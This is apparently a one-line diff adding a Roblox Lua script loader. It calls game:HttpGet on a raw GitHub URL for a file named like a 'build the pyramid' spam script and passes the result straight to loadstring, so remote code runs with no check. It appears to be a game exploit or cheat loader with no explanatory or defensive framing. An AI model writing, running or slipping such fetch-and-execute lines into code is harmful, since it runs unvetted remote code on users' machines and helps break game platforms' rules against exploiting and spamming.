@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/build-the-pyramid-spam2-171ft90cgrt18b.lua"))()
